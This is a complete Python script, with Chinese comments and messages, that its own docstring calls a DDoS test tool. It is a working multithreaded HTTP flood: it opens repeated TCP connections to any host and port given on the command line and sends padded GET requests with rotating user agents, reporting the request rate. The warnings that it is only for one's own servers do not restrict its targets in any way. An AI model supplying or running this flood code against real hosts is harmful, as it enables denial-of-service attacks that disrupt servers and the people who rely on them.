#!/usr/bin/env python3
"""
警告：
DDoS测试脚本 - 仅用于测试目的，只能在自己的服务器上使用

参数说明:
  目标地址: IP地址或域名
  端口: 可选，默认为80
  线程数: 可选，默认为100

注意:
  - 此脚本仅用于测试自己服务器的防御能力
  - 对他人服务器进行DDoS攻击是违法的
  - 使用时需谨慎，避免造成网络拥堵
"""

import socket
import threading
import time
import sys
import random

class DDoSTest:
    def __init__(self, target, port=80, threads=100):
        self.target = target
        self.port = port
        self.threads = threads
        self.running = False
        self.attack_count = 0
        self.start_time = 0
    
    def generate_random_user_agent(self):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
        ]
        return random.choice(user_agents)
    
    def attack(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target, self.port))
                
                # 生成随机大小的请求
                request_size = random.randint(100, 1000)
                request = f"GET / HTTP/1.1\r\n"
                request += f"Host: {self.target}\r\n"
                request += f"User-Agent: {self.generate_random_user_agent()}\r\n"
                request += f"Content-Length: {request_size}\r\n"
                request += "Connection: keep-alive\r\n\r\n"
                request += "A" * request_size
                
                sock.send(request.encode('utf-8'))
                sock.close()
                
                self.attack_count += 1
                if self.attack_count % 100 == 0:
                    elapsed = time.time() - self.start_time
                    print(f"[+] 已发送 {self.attack_count} 个请求, 速率: {self.attack_count/elapsed:.2f} req/s")
                    
            except Exception as e:
                pass
    
    def start(self):
        print(f"[*] 开始DDoS测试...")
        print(f"[*] 目标: {self.target}:{self.port}")
        print(f"[*] 线程数: {self.threads}")
        print("[*] 按 Ctrl+C 停止测试")
        
        self.running = True
        self.start_time = time.time()
        
        # 创建并启动线程
        thread_list = []
        for i in range(self.threads):
            t = threading.Thread(target=self.attack)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            print("\n[*] 停止测试...")
            
            # 等待所有线程结束
            for t in thread_list:
                t.join(timeout=1)
            
            elapsed = time.time() - self.start_time
            print(f"[*] 测试完成")
            print(f"[*] 总请求数: {self.attack_count}")
            print(f"[*] 测试时间: {elapsed:.2f} 秒")
            print(f"[*] 平均速率: {self.attack_count/elapsed:.2f} req/s")

def main():
    if len(sys.argv) < 2:
        print("基本用法:python ddos_test.py <目标地址> [端口] [线程数]")
        print("python ddos_test.py 127.0.0.1")
        print("python ddos_test.py example.com 8080")
        print("python ddos_test.py https://example.com 8080 200")
        sys.exit(1)
    
    target = sys.argv[1]
    port = 80
    threads = 100
    
    # 处理端口参数
    if len(sys.argv) > 2:
        try:
            port = int(sys.argv[2])
        except ValueError:
            print("错误: 端口必须是数字")
            sys.exit(1)
    
    # 处理线程数参数
    if len(sys.argv) > 3:
        try:
            threads = int(sys.argv[3])
            if threads <= 0:
                print("错误: 线程数必须大于0")
                sys.exit(1)
        except ValueError:
            print("错误: 线程数必须是数字")
            sys.exit(1)
    
    # 清理目标地址，移除反引号和空格
    target = target.strip('` ')
    
    # 处理带有协议前缀的URL
    if target.startswith('http://'):
        target = target[7:]
    elif target.startswith('https://'):
        target = target[8:]
    
    # 移除路径部分，只保留域名或IP
    if '/' in target:
        target = target.split('/')[0]
    
    # 验证目标是否可解析
    try:
        socket.gethostbyname(target)
    except socket.gaierror:
        print(f"错误: 无法解析目标地址 '{target}'")
        sys.exit(1)
    
    print("=" * 60)
    print("警告: 此脚本仅用于测试自己服务器的防御能力")
    print("对他人服务器进行DDoS攻击是违法的")
    print("=" * 60)
    
    input("按 Enter 键继续...")
    
    tester = DDoSTest(target, port, threads)
    tester.start()

if __name__ == "__main__":
    main()